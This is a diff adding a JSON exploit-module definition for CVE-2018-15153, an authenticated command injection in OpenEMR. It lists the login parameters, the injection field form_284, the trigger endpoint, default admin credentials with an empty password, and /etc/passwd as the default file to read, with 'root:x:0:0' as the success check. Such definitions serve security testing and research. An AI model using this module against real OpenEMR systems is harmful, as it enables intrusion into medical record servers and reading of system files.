@@ -1,0 +1,37 @@
+{
+  "cve": "CVE-2018-15153",
+  "name": "OpenEMR prior to 5.0.1.4 OS Command Injection via hylafax_server",
+  "description": "OS command injection in OpenEMR before 5.0.1.4 allows a remote authenticated attacker to execute arbitrary commands by changing the hylafax_server global setting and triggering daemon_frame.php.",
+  "disclosure_date": "2018-08-15",
+  "edb": "45161",
+  "vuln_class": "rce",
+  "vuln_endpoint": "/interface/main/daemon_frame.php",
+  "vuln_method": "GET",
+  "vuln_params": {},
+  "injection_endpoint": "/interface/super/edit_globals.php",
+  "injection_method": "POST",
+  "injection_param": "form_284",
+  "auth_endpoint": "/interface/main/main_screen.php?auth=login&site={{site}}",
+  "auth_params": {
+    "new_login_session_management": "1",
+    "authProvider": "Default",
+    "authUser": "{{user}}",
+    "clearPass": "{{password}}",
+    "languageChoice": "1"
+  },
+  "confirm_pattern": "root:x:0:0",
+  "fail_markers": ["login_screen.php?error=1", "Not authorized"],
+  "default_username": "admin",
+  "default_filepath": "/etc/passwd",
+  "target_uri": "/",
+  "module_type": "exploit",
+  "author": "AMENDER / Rezwanul Haque",
+  "default_password": "",
+  "references": [["CVE", "2018-15153"], ["EDB", "45161"]],
+  "login_params": {
+    "new_login_session_management": "1",
+    "authProvider": "Default",
+    "languageChoice": "1"
+  },
+  "_notes": "This is OS command injection via hylafax_server global setting, not file upload RCE. The PoC injects commands by modifying form_284 in edit_globals.php then triggering daemon_frame.php."
+}
